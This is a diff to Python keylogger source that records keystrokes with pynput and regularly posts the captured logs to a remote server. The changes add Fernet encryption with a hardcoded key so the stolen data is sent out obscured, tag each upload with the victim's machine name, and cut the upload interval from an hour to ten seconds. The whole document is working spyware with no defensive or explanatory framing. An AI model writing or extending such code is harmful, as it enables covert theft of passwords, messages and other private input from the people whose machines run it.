@@ -4,6 +4,7 @@ import threading
 import json
 from pynput import keyboard
 from pynput.keyboard import Key
+from cryptography.fernet import Fernet
 
 class KeyLoggerService:
     def __init__(self):
@@ -45,6 +46,8 @@ class ServerSender:
         self.server_url = server_url
         self.service = service
         self.machine_name = machine_name
+        self.key = b'9YxKn3m3G5qXz2o9xYxKn3m3G5qXz2o9xYxKn3m3G5q='
+        self.fernet = Fernet(self.key)
         threading.Thread(target=self.send_to_server, daemon=True).start()
 
     def send_to_server(self):
@@ -56,12 +59,14 @@ class ServerSender:
                     "data": logs
                 }
                 try:
-                    response = requests.post(self.server_url, json=new_task)
+                    encrypted_data = self.fernet.encrypt(json.dumps(new_task).encode())
+                    headers = {"X-Machine-Name": self.machine_name}
+                    response = requests.post(self.server_url, data=encrypted_data, headers=headers)
                     print(f"Data sent to server. Response: {response.text}")
                     self.service.clear_logs()
                 except requests.exceptions.RequestException as e:
                     print(f"Error sending data: {e}")
-            time.sleep(3600)
+            time.sleep(10)
 
 class KeyLoggerManager:
     def __init__(self):
@@ -75,15 +80,11 @@ class KeyLoggerManager:
         if key == Key.space:
             logs = self.service.save_and_clear()
             self.file_writer.write_to_file(logs)
-        
 
     def start(self):
         with keyboard.Listener(on_release=self.handle_key_press) as listener:
             self.listener = listener
             listener.join()
-
-class Encrypter:
-    pass
 
 if __name__ == "__main__":
     manager = KeyLoggerManager()
